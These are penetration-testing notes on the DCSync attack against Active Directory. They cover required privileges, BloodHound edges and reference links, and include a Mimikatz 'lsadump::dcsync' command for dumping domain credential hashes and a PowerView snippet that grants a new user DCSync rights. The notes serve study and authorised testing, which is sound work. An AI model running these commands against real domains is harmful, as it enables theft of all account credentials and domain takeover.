# DCSync Attack
Used to sync information from a Domain Controller to another user account with the correct permissions. 

**Introduction**
[https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)

**Hacktricks** **& Guides**
[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
[https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)

**Requirements**
To run a DCSync attack, we need access to an account which is a member of the following:
- *Administrators*
- *Domain Admins*
- *Enterprise Admins*
- *or a Domain Controller (not a read-only DC)*

The following rights are also needed, and are usually included in the members above:
- Replicating Directory Changes ([DS-Replication-Get-Changes](https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes))
- Replicating Directory Changes All ([DS-Replication-Get-Changes-All](https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all))

Further information is here:
[https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/](https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/)

**Bloodhound connections
- *WriteDacl*
- *GetChanges*
- *GetChangesAll* 

**Mimikatz Exploit**, Local.
The base command to run as a user with the correct privileges described above is:
```
.\mimikatz 'lsadump::dcsync /domain:DOMAIN.NAME /user:USER' exit
```
We need to be able to talk to the Domain Controller on TCP 445 and 135 and a high RPC port.

An alternative to Mimikatz is to use Impacket's [`secretsdump.py`](obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FActive%20Directory%2FAttacks%2FSecretsDump) and exploit remotely.

**More information:**
[https://adsecurity.org/?p=1729](https://adsecurity.org/?p=1729)

**Creating and adding a new user to a group.**
1) Create a new users, check [here](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FWindows%2FPowerShell) for how to do that.
2) Add them to a group like `net group "GROUP_NAME" USERNAME /add`
3) Add-DomainObjectACL
```
Import-Module ./PowerView.ps1
$SecPassword = ConvertTo-SecureString 'USER_PASSWORD from step 1' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=(get from LADP),DC=local" -PrincipalIdentity "USERNAME from step 1" -Rights DCSync
```

**Mitigation against DCSync** 
[https://hkeylocalmachine.com/?p=928](https://hkeylocalmachine.com/?p=928)